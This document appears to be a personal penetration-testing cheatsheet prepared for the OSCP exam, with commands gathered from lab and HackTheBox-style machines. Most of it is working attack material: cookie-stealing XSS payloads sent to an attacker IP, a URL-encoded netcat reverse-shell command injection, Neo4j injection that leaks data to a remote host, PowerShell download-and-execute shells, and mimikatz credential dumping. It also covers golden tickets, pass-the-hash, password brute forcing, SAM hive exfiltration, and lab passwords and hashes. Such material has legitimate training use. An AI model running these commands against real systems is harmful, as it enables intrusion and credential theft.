# Useful techniques for OSCP exam

Hi. If you are giving your OSCP exam, best of luck!

This cheatsheet contains cheatsheet to techniques I used to pass the exam and those given in the course.

## upgrading shells

```

https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html

python
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'

perl -e 'exec "/bin/sh";'

/bin/sh -i

https://www.nickczh.com/upgrading-your-shell/



```

## gobuster

```

`gobuster dir --url https://10.129.240.189 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k`


```

## gobuster dns enumeration

```

`gobuster dns -d snoopy.htb -w /usr/share/spiderfoot/spiderfoot/dicts/subdomains-10000.txt -r 10.129.188.75 -i`


```

## dirb

```

for php pages dirb works best

`dirb http://mailroom.htb`


```

## dirsearch

```

`dirsearch -u http://mailroom.htb -t 200`


```

## fuff subdomain enumeration

```

`ffuf -w /snap/seclists/25/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.mailroom.htb" -u http://mailroom.htb -fs 7746`


```

## subdomain enumeration gobuster

```
`gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain`


```

## gobuster status code

```
go buster status code : `gobuster dir -u https://www.vvvv.com/ -w /usr/share/wordlists/dirb/common.txt -b '403,404'`

using wget to reveal the text as /root/root

sudo wget --input-file /root/root.txt

https://gtfobins.github.io/



```

## wpscan

```


wpscan --url https://brainfuck.htb --disable-tls-checks

wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan



```

## for ciphers

```

https://rumkin.com/tools/cipher/ for ciphers


```

## sql injection

```

`sqlmap -r login.req`

sqlinjection try: `admin'-- -`


```

## Using Hydra

```


hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid"



hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect"




```

## hacktools extensions

```

Yuo can use the extension of hacktoools for generating reverse shells


```

## ansible privilege escalation

```

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/?ref=nickczh.com


```

## adding keys

```

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fQqdcN8qxqB3OH9lCBMyGcAz+c8a5uRxuvif1A98/jv5LLYy/2GO7r68nHOSIviFtkbnydmuTyzBBSWhbxC/M...InI6BlsXQ65H3xw+yFxndxeKi3Gu17glt3OEe8aAPaxj3qU89L1xbOr4m3mSqnhJne7eV05nqYvZDH...nDx7QWw6WtrQigNlEGNcWJUVKNlXBGoGHZuyHNMpoh4XjinLeM9GKFY4xRxk2CyFBLwlouOtj7s5EtFB5CLnaQMpDtzI+gJyma7nzxJZxELrlTHyjPJoQHQSmlQe+tBNBRAEL92wac79psK7s3PARdCcyEnpe8l9cplPP8YIS8tMg6BVVjTGPQNN0BJBwRxEjrvAKae1phztkQD7tZKy3aEl8VCUR8tpJ0fw0mK6/PJGxgCYXZWWKwycHOnJKQYDL17qsTypaLL8=" >> authorized_keys


```

## Proxychains

```

proxychains evil-winrm -u matthew -p 147258269 -i 172.16.22.1

trying evil winrm on dc with prooxychains

https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29

sudo ./chisel server -p 8081 --reverse
- on attacker

./chisel client 10.10.16.24:8081 R:socks
- on victim

on attacker
sudo nano /etc/proxychains4.conf

`socks5   127.0.0.1   1080`

how to add attacker ot proxychains is what i need to look into


local port forwarfing using chisel

./chisel client 192.168.45.207:8082 R:8090:127.0.0.1:8000


```

## using chisel through evilwinrm

```

./chisel client 10.10.16.24:8001 R:5985:172.16.22.1:5985
./chisel server -p 8001 — reverse

.\chisel.exe client 10.10.16.24:9095 R:80localhost:80 R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
./chisel server -p 9095 -reverse


```

## cross site scripting / XSS

```

<img src="10.10.16.24:8000/test.jpg" /> <script src="http://10.10.16.24:8000/cookie.js"></script>


var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.16.24:9001/?test='+document.cookie, true);
request.send()


https://github.com/shelld3v/JSshell
for shell


jsh.py -g

<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.16.24:4848/?".concat(document.cookie)},1010)</script>

this will get a shell to extract cookies.


```

## mysql interaction

```


mysql --host=db --user=root --password=root cacti -e "show table"



```

## DNS zone transfer

```


https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/

dig command syntaxt snoopy.htb @<snoopy actual ip>
`dig axfr snoopy.htb @10.10.11.212`


```

## dns mitm

```

dns mitm is possible if you manafe to get the dns key from

/etc/bind/named.conf



key "rndc-key" {
algorithm hmac-sha256;
secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};



nsupdate -d -y hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=
Creating key...
namefromtext
keycreate
> server snoopy.htb
> update add mail.snoopy.htb 86400 IN A 10.10.16.47
> send


python -m smtpd -c DebuggingServer -n 127.0.0.1:25


```

## LFI vulnerability

```

GET /download?file=....//....//....//....//etc/passwd HTTP/1.1


```

## nmap reference hyperbeast

```


❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.150.83 -oG allPorts


then on specific ports


nmap -p22,80 -sCV 10.129.90.230 -oN targeted



sudo nmap -p 161 -sU 192.168.203.145 --script=snmp-*



```

## targeted nmap

```


nmap -p22,53,80 -sCV 10.129.150.83 -oN targeted



```

## post request with curl

```


curl --location 'http://10.10.11.224:55555/api/baskets/yesterday' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'


curl -X POST --data 'Archive=git%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.45.194%204444%20%3E%2Ftmp%2Ff' http://192.168.230.16/archive

you can use the curl traffic to intercept


curl --proxy localhost:8080 -s -X POST http://beta.only4you.htb/download -d "image=/etc/nginx/sites-enabled/default"



```

## Neo4j enumeration

```


'OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.47/?label='+label as l RETURN 0 as _0 //
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.47/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //



```

## git

```

`python3 git-dumper.py http://pilgrimage.htb git-dumps`

secondly there might be instances where we might have to go back to a previous commit.

`git log`

then
`git checkout <commitid>`

or git show



```

## checking for suid binaries

```

`$ find / -perm -u=s 2>/dev/null`


```

## scp

```

to download

scp stuart@192.168.193.144:/opt/backup/sitebackup3.zip ./site3.zip


```

## port 1978 unisql

```

mouse exploit rce , try metsaploit
sometimes may not work as well


```

## snmp

```

>snmpwalk -v 1 192.222.206.3 -c public

https://blog.pentesteracademy.com/snmp-exploitation-with-metasploit-and-snmpset-920de3fc2c50


snmpwalk -v1 -c public 192.168.207.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull



```

## using ligolo

```

https://github.com/nicocha30/ligolo-ng/releases

get ligolo agent and proxy from above.

agent to be sent to the target machine. remeber to send appropriate agent base don the architecture


at your base use the proxy binary



sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up



./lin-proxy -selfcert -laddr 0.0.0.0:443


if 4433 port is not allowed choose 80


at the target machine

>curl http://192.168.45.195:8000/linux_amd_ligolo_agent -o linux_amd_ligolo_agent

>>curl http://192.168.45.195:8000/ligolo_amd64.exe -o ligolo_amd.exe


.\ligolo_amd.exe -connect 192.168.45.195:443 -ignore-cert


look at the ipconfig of the machine see the ip config

where 172.16.117.0/24 is the internal network ip.


sudo ip route add 172.16.102.0/24 dev ligolo

sudo ip route add 10.10.123.0/24 dev ligolo


in the ligolo console start proxy
session
start


```

## ligolo setting traffic for outbound

```

listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4445

https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5


```

## creating kali upload server

```


<?php
echo "upload server";
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["targetfile"]["name"]);
echo $target_file;
move_uploaded_file($_FILES["targetfile"]["tmp_name"], $target_file)
?>


add tihs php

service apache2 start

put upload.php at /var/www/html/web/upload.php

mkdir /var/www/html/web/uploads
chown www-data:www-data /var/www/html/web/uploads
chmod 766 /var/www/html/web/uploads


onligolo

listener_add --addr 0.0.0.0:80 --to 0.0.0.0:80

on windows
curl http://10.10.131.147/web/upload.php -o upload.php

powershell -nop -exec bypass Invoke-RestMethod -Uri http://10.10.131.147/web/upload.php -Method Post -Infile 'C:\windows.old\Windows\System32\SYSTEM'

powershell -nop -exec bypass Invoke-RestMethod -Uri http://10.10.131.147/web/upload.php -Method Post -Infile 'C:\windows.old\Windows\System32\SAM'






```

## adduser

```

`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`


```

## xfreerdp

```

>xfreerdp /u:jeff /v:192.168.201.75 /d:corp.com /drive:/home,/home/kali/code/
>xfreerdp /u:administrator /p:'vau!XCKjNQBv2$' /v:172.16.124.6:3389 /h:1080 /w:1920 /floatbar /smart-sizing -grab-keyboard


```

## for fullscreen

```

>xfreerdp /u:yoshi /p:Mushroom! /v:172.16.195.82 /drive:/home,/home/kali/code/ /workarea


```

## powerup commands

```

.\SharpUp.exe audit

>. .\powerup.ps1
>Invoke-allchecks
for abuse
>Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"


```

## reverse shell

```

for reverse shell
https://www.revshells.com/
always try
nc mkfifo for linux
powershell base64 for windows


```

## Web enumeration

```

checking for page content for js css and html
gobuster - gave me /console - incorporate pattern, -x file type and alos try with directory large after medium
dirb - nothing
make a list of all inputs
checking for dir listing in url also
checking for sql - but thats later
checking for xss
always nmap enumeration thorough it could have non standard ports like 8000
check for command injection with &&
command injection check for escape characters especially "&&<command>" also try to url encode all characters if it dowsnot work
when trying reverse shell use bash -c reverse shell payload


```

## python2 trouble shooting

```

python2 has dropped support for pip so you have to use a script called get-pip.py to install pip then you can install modules for python2 as

`python2 -m pip install lxml`


```

## msfvenom

```

>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc

>msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"


```

## windows reverse shell

```

>powershell IEX(IWR http://192.168.45.159:8000/conptyshell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.159 9997;

>stty raw -echo; (stty size; cat) | nc -lvnp 9997


```

## nishang reverse shell ?

```


```

## crackmapexec

```

bruteforce
>crackmapexec smb 192.168.228.242 -u usernames -p passwords --continue-on-success

>crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares

>crackmapexec smb 192.168.211.70 -u corp.com/maria -H 2a944a58d4ffa77137b2c587e6ed7626


```

## transfer from windows

```

>python -m uploadserver 8081

>curl -X POST http://192.168.45.246:8001/upload -F 'files=@20230910230352_BloodHound.zip'

using certutil

certutil -encode 20230910230352_BloodHound.zip tmp.b64 && findstr /v /c:- tmp.b64 > data.b64

base64 -d data.b64 > 20230910230352_BloodHound.zip


```

## mimkatz

```

if you get
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

you are using old version of mimikatz

privilege::debug
sekurlsa::logonpasswords
lsadump::lsa /patch
lsadump::sam
lsadump::secrets
lsadump::cache

copy e:\mimikatz.exe
.\mimikatz.exe "log ash.txt" "privilege::debug" "token::elevate"  "lsadump::sam" "sekurlsa::logonpasswords" "exit"

sekurlsa::pth /user:jeff /domain:jefflab.com /ntlm:asdasdasd
user can be any

>kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240

lsadump::lsa /inject for after dc sync


```

## cracking mscache v2

```

https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials

$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6
$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a

hashcat -m2100 '$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6' /usr/share/wordlists/rockyou.txt --force --potfile-disable


```

## powerview commands

```


>Import-Module .\PowerView.ps1

>Get-NetDomain

>Get-NetUser

>Get-NetUser | select cn

>Get-NetUser | select cn, pwdlastset,lastlogon

>Get-NetGroup | select cn

>Get-NetGroup "Sales Department" | select member

>Get-NetComputer

>Get-NetComputer | select operatingsystem,dnshostname

>Find-LocalAdminAccess

>Get-NEtSession -ComputerName files04

>FInd-DomainShare

> Get-Acl -Path
HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl


```

## Searching for all files on windows

```

Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.kdbx,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log, *git*, *.lnk  -File -Recurse -ErrorAction SilentlyContinue

ini is not include you may tun for ini again
-hidden only searches for hidden file

Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.kdbx,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue -Hidden -Exclude "Win"

Get-ChildItem -Path C:\ -Include local.txt,proof.txt,*.kdbx,id_*,authorized_keys,known_hosts,*.git,*.key,*.keyx -Recurse -Force -ErrorAction silentlycontinue

Get-ChildItem -Path C:\users\* -Recurse -ErrorAction silentlycontinue

Get-ChildItem -Path C:\ -Include local.txt -Recurse -ErrorAction silentlycontinue
Get-ChildItem -Path C:\ -Include proof.txt -Recurse -ErrorAction silentlycontinue


Get-ChildItem -Path C:\ -Include local.txt,proof.txt,*.kdbx,id_*,authorized_keys,known_hosts,*.git,*.key,*.keyx -Recurse -Force -ErrorAction silentlycontinue

> -Force => hiden files


```

## history

```
Get-PSReadLineOption

=> HistorySavePath

cat (Get-PSReadLineOption).HistorySavePath


```

## get history

```

(Get-PSReadlineOption).HistorySavePath

Get-History


```

## windows post exploitation

```

Get-ChildItem -Path C:\users\* -Recurse -ErrorAction silentlycontinue

Get-ChildItem -Path C:\ -Include local.txt -Recurse -ErrorAction silentlycontinue
Get-ChildItem -Path C:\ -Include proof.txt -Recurse -ErrorAction silentlycontinue

Get-ChildItem -Path C:\ -Include local.txt,proof.txt,*.kdbx,id_*,authorized_keys,known_hosts,*.git,*.key,*.keyx -Recurse -Force -ErrorAction silentlycontinue

> -Force => hiden files


```

## history

```
Get-PSReadLineOption

=> HistorySavePath

cat (Get-PSReadLineOption).HistorySavePath


```

## impacket

```

impacket-smbserver
impacket-psexec
impacket-secretsdump


```

## brute forcing ssh

```

hydra -l offsec -P /usr/share/wordlists/rockyou.txt 192.168.X.122 -t 4 ssh -V -f


```

## config files to check with directory listing

```

1. .bashrc
2. .bash_history
3. .ssh/id_rsa

while checking check for case senitive


```

## to unshadow files in linux

```

crack /etc/shadow

sudo /usr/sbin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db
john -show /tmp/crack.password.db


```

## accessing smbshare

```
smbmap -H 192.168.207.248

smbclient --no-pass -L //192.168.207.248
smbclient //192.168.207.248/Users
smbclient //192.168.207.248/transfer


```

## to donwload all files of smb recursively

```

smbclient -Udomainname/fordodone //10.234.92.21/sharename
Password:
Domain=[DOMAINNAME] OS=[Windows 5.0] Server=[Windows 2000 LAN Manager]
smb: \> cd testdir
smb: \testdir\> get C
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \testdir\C
smb: \testdir\> prompt
smb: \testdir\> recurse
smb: \testdir\> mget C

smbclient  //x.x.x.x/share -U 'relia/jim'
smb: \> dir

smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

getting file ...

you can do mget * to get all the files tio local system


```

## privesccheck.ps1 in windows

```

. .\privesccheck.ps1
Invoke-privesccheck -extended


```

## sharing files from windows to kali

```

>python3 /usr/lib/python3/dist-packages/impacket/smbserver.py -smb2support myshare2 .

on windows

>net use \\192.168.45.152\myshare2

certutil -encode Database.kdbx tmp.b64 && findstr /v /c:- tmp.b64 > data.b64

certutil -encode Database.kdbx
base64 -d data.b64 > 20230910230352_BloodHound.zip


```

## postmouht

```

somehtinghta can happne anywhere
cd


```

## running services in linux

```

ss -ntlpu


```

## using 2

```

reg save hklm\sam c:\sam.reg
reg save hklm\system c:\system.reg

sudo 2 System.reg sam.reg
2 SYSTEM SAM > MS02.hashes

proxychains secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'

The sam database contains the local accounts. We will ignore vagrant as it is the default
user to setup the lab.
The important information here is the NT hash of the local administrator user.
We also got the LSA cache of the last connected users (by default windows keep the last
10 users), this is useful to connect to the server even if the domain controller is
unreachable. But those cached credentials can be cracked offline with hashcat (very slow).
And to finish we also got the hash of the computer account. (Sometimes you will get no
useful domain accounts or no information at all on a domain joined computer but if you get
this hash you got an account on the domain!)
With a machine account you can query the ldap like any other users and you can also run
bloodhound ingest

lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22

DonPAPI -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'

smbclient.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug

With a socks connection you can only use smbexec or atexec. Neither wmiexec, psexec
nor dcomexec will work. (explainations here
: https://github.com/SecureAuthCorp/impacket/issues/412


```

## File uploading and downloading from windows.old

```

C:\windows.old\Windows\System32\SAM
C:\windows.old\Windows\System32\SYSTEM

in internal network one might have to run
listener_add --addr 0.0.0.0:9001 --to 0.0.0.0:9000

python3 -m uploadserver 9000

cdd to the directory

cmd /c curl -X POST http://10.10.123.141:9003/upload -F 'files=@SAM'

cmd /c curl -X POST http://10.10.123.141:9003/upload -F 'files=@SYSTEM'

cmd /c "curl -X POST http://172.16.117.5:9001/upload -F 'files=@hashes.kerberoast'"

NOTE :: ALWAYS RUN THIS INSIDE POWERSHELL


```

## As reproastiing

```
> .\Rubeus.exe asreproast /nowrap

>sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


```

## kerberoasting

```

>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
-r /usr/share/hashcat/rules/best64.rule --force


```

## privilege escalation

```

To access to msf console while our session is open use background command. It sends you back to msf console and you can return to session with sessions -i 'sessionid' if you are confused with your session id you can use sessions -l to list all open sessions. After returning to msf console we can use exploit/[windows/linux]/local/"name of the exploit" to select our local exploit then we should set “SESSION’’ to our session id(if necessary set other params too)
```

